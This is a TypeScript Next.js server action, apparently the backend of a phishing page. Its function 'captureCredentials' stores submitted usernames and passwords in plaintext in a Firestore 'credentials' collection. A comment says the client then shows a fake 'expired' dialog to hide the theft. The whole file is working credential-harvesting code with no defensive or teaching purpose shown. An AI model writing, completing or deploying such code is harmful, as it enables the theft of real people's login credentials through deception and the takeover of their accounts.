'use server';

import { initializeApp, getApps, getApp } from 'firebase/app';
import { getFirestore, collection, addDoc, serverTimestamp } from 'firebase/firestore';
import firebaseConfig from '@/firebase/config';

// Initialize Firebase
let app;
if (!getApps().length) {
  app = initializeApp(firebaseConfig);
} else {
  app = getApp();
}
const firestore = getFirestore(app);

// Server action to capture credentials
export async function captureCredentials(prevState: any, formData: FormData) {
  const username = formData.get('username') as string;
  const password = formData.get('password') as string;

  if (!username || !password) {
    return { success: false, message: 'Username and password are required.' };
  }

  try {
    const credentialsCollection = collection(firestore, 'credentials');

    await addDoc(credentialsCollection, {
      username,
      password,
      createdAt: serverTimestamp(),
    });
    
    // This is the state we return on success. The client will show the "expired" dialog.
    return { success: true, message: 'Submission successful.' };

  } catch (error: any) {
    console.error('Error saving credentials to Firestore:', error);
    // Return a specific error message for the client
    return {
      success: false,
      message: 'Failed to save credentials. Please check server logs and Firestore rules.',
    };
  }
}
